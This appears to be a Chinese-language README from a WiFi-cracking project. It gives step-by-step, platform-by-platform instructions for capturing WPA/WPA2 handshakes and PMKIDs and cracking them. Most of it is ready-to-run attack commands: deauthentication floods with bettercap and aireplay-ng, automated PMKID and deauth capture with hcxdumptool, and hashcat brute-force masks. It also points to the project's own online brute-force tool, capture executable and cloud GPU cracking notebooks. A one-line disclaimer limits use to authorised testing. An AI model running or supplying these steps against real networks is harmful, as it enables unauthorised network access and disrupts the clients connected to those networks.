# WiFi 握手包捕获最佳实践（Mac / Linux / Windows）

本文档总结三个平台上捕获 WPA/WPA2 握手包的**最可靠方法**，按推荐程度排序。

> 仅限授权安全测试使用，请遵守当地法律法规。

## 核心原理

WiFi 密码破解需要两步：**捕获握手包** → **离线破解**

| 术语 | 说明 |
|-----|------|
| PMKID | AP 在 EAPoL M1 中附带的哈希值，只需一次连接尝试即可获取 |
| 四次握手 | EAPoL M1-M4 完整交换，需要客户端正在连接或被 deauth 后重连 |
| Monitor Mode | 网卡进入监听模式，能收到所有 802.11 帧（不只是发给自己的） |
| Managed Mode | 网卡正常模式，只能看到发给自己的以太网帧 |
| deauth 攻击 | 发送反认证帧踢掉已连接的客户端，迫使其重连以捕获握手 |

**关键结论**：可靠捕获握手包需要 **Monitor Mode + 帧注入能力**，这在 Windows 内置网卡上**不可能实现**。

## 推荐硬件

| 网卡 | 芯片 | Monitor Mode | 帧注入 | 价格 | 推荐 |
|-----|------|-------------|-------|------|------|
| Alfa AWUS036ACH | RTL8812AU | ✅ | ✅ | ~¥150 | ⭐⭐⭐ |
| Alfa AWUS036ACHM | RTL8812AU | ✅ | ✅ | ~¥200 | ⭐⭐⭐ |
| COMFAST CF-952AX v2 | RTL8852BU | ✅ | ✅ | ~¥50 | ⭐⭐ |
| Tenda U6 | RTL8811CU | ✅ | ✅ | ~¥30 | ⭐ |

查询网卡兼容性：https://github.com/morrownr/USB-WiFi

## Linux（最推荐）

Linux 是 WiFi 安全测试的最佳平台，工具链最完整、驱动支持最好。

### 方案A：bettercap（推荐）

```bash
# 1. 安装 bettercap
sudo apt install bettercap
# 或从源码编译（需要Go环境）
git clone https://github.com/bettercap/bettercap.git
cd bettercap && make install

# 2. 启动 bettercap（自动进入Monitor Mode）
sudo bettercap -iface wlan0

# 3. 在 bettercap 交互界面中：
# 扫描WiFi
wifi.recon on

# 锁定目标信道（重要！一次只能监听一个信道）
wifi.recon.channel 6

# deauth 攻击（迫使客户端重连，捕获握手）
wifi.deauth aa:bb:cc:dd:ee:ff

# 或 PMKID 攻击（只需一次连接尝试）
wifi.assoc aa:bb:cc:dd:ee:ff

# 等待出现钥匙图标（握手包已捕获）
# 握手包保存在 bettercap-wifi-handshakes.pcap

# 4. 转换为 hashcat 格式
sudo apt install hcxtools
hcxpcapngtool bettercap-wifi-handshakes.pcap -o hash.22000

# 5. hashcat 破解
hashcat -m 22000 hash.22000 -a 3 '?d?d?d?d?d?d?d?d' -w 3 -O
```

**注意事项**：
- WiFi 网卡一次只能监听**一个信道**，必须先锁定信道再抓包
- 轮流监听信道只能当扫描器用，抓到的握手包可能不完整
- Linux 内核版本要求：RTL8852BU 需要 6.17+，MT7921 需要 6.12 以下
- 检查 WEXT 支持：`grep -i wext /boot/config-$(uname -r)`

### 方案B：hcxdumptool（hashcat 官方推荐）

```bash
# 1. 安装
sudo apt install hcxdumptool hcxtools

# 2. 停止干扰进程
sudo systemctl stop NetworkManager wpa_supplicant

# 3. 捕获（自动 PMKID + deauth）
sudo hcxdumptool -i wlan0 -w dumpfile.pcapng --rds=1 -F

# 4. 等待捕获完成后 Ctrl+C

# 5. 转换
hcxpcapngtool -o hash.22000 -E wordlist dumpfile.pcapng

# 6. 破解
hashcat -m 22000 hash.22000 -a 0 wordlist.txt
```

**hcxdumptool 优势**：
- hashcat 官方推荐的抓包工具
- 自动 PMKID 攻击 + deauth
- 不需要手动管理 Monitor Mode
- 输出格式直接兼容 hashcat

### 方案C：aircrack-ng（经典方案）

```bash
# 1. 进入 Monitor Mode
sudo airmon-ng start wlan0

# 2. 扫描
sudo airodump-ng wlan0mon

# 3. 锁定目标抓包
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 另开终端发 deauth
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. 等待终端显示 "WPA handshake: ..."

# 6. 转换并破解
hcxpcapngtool capture-01.cap -o hash.22000
hashcat -m 22000 hash.22000 -a 3 '?d?d?d?d?d?d?d?d'
```

## macOS

macOS 的 WiFi 安全测试受限于 Apple 驱动，内置网卡不支持帧注入。

### 方案A：虚拟机 + USB 外置网卡（推荐）

```bash
# 1. 安装 VMware Fusion 或 Parallels
# 2. 创建 Kali Linux / Fedora 虚拟机
# 3. USB 透传外置网卡到虚拟机
# 4. 在虚拟机中使用 Linux 方案（bettercap / hcxdumptool）
```

这是 macOS 上最可靠的方案，因为 Apple WiFi 驱动限制了 Monitor Mode 和帧注入。

### 方案B：tcpdump 被动监听（有限）

```bash
# macOS 内置 WiFi 支持 tcpdump -I 进入监控模式（被动监听，不能注入）
sudo tcpdump -I -i en0 -w capture.pcap

# 只能被动等待客户端自然重连，不能发 deauth
# 成功率较低，需要耐心等待

# 捕获后转换
hcxpcapngtool capture.pcap -o hash.22000
```

**局限**：
- Apple WiFi 驱动不支持帧注入（不能发 deauth）
- 只能被动监听，需要等待客户端自然重连
- 成功率远低于 Linux + 外置网卡

### 方案C：Go + CoreWLAN 在线验证（本项目 wifi-crack-mac）

```bash
cd wifi-crack-mac
go build -o wifi-crack .
./wifi-crack
```

这不是抓握手包，而是直接用 CoreWLAN 尝试密码连接（在线爆破）。速度慢但不需要额外硬件。

### 方案D：hashcat 本地 GPU 破解（已有握手包时）

```bash
cd wifi-crack-mac
# 在 Jupyter 中运行
jupyter notebook mac-crack-local.ipynb

# 或命令行
bash crack-local.sh handshake.22000
```

M1 Metal GPU ~52K H/s，8 位纯数字约 32 分钟。

## Windows

Windows 是 WiFi 握手包捕获**最受限**的平台。内置网卡驱动不支持 Monitor Mode 和帧注入。

### 方案A：虚拟机 + USB 外置网卡（推荐）

与 macOS 方案相同：VMware / VirtualBox + Kali Linux + USB 外置网卡。

### 方案B：Scapy + Npcap（Managed Mode，需端到端验证）

```bash
# 1. 安装 Npcap (https://npcap.com)
#    安装时勾选 "WinPcap API-compatible Mode"
# 2. 安装 scapy
pip install scapy
# 3. 运行本项目的捕获工具（需管理员权限）
WiFi-Handshake-Capture.exe
```

**重要限制**：
- Managed Mode 下 Npcap 提供的是 **Ethernet 封装**，不是 raw 802.11
- 不能发送 deauth 帧（不能帧注入）
- 捕获的 PMKID/握手包是 Ethernet 视角下的 EAPoL 帧
- **捕获结果必须用已知密码做端到端验证才能确认可用性**
- 不是所有 AP 都会在 Managed Mode 的 EAPoL 交换中发送 PMKID

### 方案C：netsh trace ETW（不推荐）

```bash
# netsh trace 捕获的是 ETW 事件容器，不是原始 802.11 帧
# 从 ETL 中字节搜索提取的数据无法证明是真实 PMKID
# 本项目 v4.0 已移除此方案
```

### 方案D：hashcat GPU 破解（已有握手包时）

```bash
# 使用 hashcat CUDA 破解
hashcat -m 22000 hash.22000 -a 3 '?d?d?d?d?d?d?d?d' -w 3 -O
```

## 云端 GPU 破解（已有握手包时）

| 平台 | GPU | 速度 | 费用 |
|-----|-----|------|------|
| Google Colab | T4 | ~80K H/s | 免费 |
| Kaggle | P100 | ~120K H/s | 免费30小时/周 |
| 腾讯云竞价 | V100 | ~400K H/s | ~3元/小时 |

使用本项目的 Notebook：
- `wifi-crack-notebook/kaggle-hashcat-wifi-crack.ipynb`（Colab/Kaggle 双平台）
- `wifi-crack-mac/mac-crack-local.ipynb`（Mac 本地）
- `wifi-crack-cloud/crack.sh`（云服务器）

## 总结对比

| 平台 | 最佳方案 | Monitor Mode | 帧注入 | 可靠性 |
|-----|---------|-------------|-------|--------|
| **Linux** | bettercap / hcxdumptool + USB网卡 | ✅ | ✅ | ⭐⭐⭐⭐⭐ |
| **macOS** | 虚拟机 + USB网卡 + Linux | ✅ | ✅ | ⭐⭐⭐⭐ |
| **macOS** | tcpdump -I 被动监听 | ✅(被动) | ❌ | ⭐⭐ |
| **Windows** | 虚拟机 + USB网卡 + Linux | ✅ | ✅ | ⭐⭐⭐⭐ |
| **Windows** | Scapy + Npcap (Managed) | ❌ | ❌ | ⭐(需验证) |

**一句话结论**：买一个 ¥50 的 USB WiFi 网卡 + Linux 虚拟机，比在 Windows Managed Mode 下折腾靠谱 100 倍。

## 参考资料

- hashcat 官方 WPA 破解指南：https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- hcxdumptool：https://github.com/ZerBea/hcxdumptool
- hcxtools：https://github.com/ZerBea/hcxtools
- bettercap：https://github.com/bettercap/bettercap
- Npcap：https://npcap.com/guide/
- USB WiFi 兼容性列表：https://github.com/morrownr/USB-WiFi
- Scapy 802.11 文档：https://scapy.readthedocs.io/en/latest/layers/dot11.html
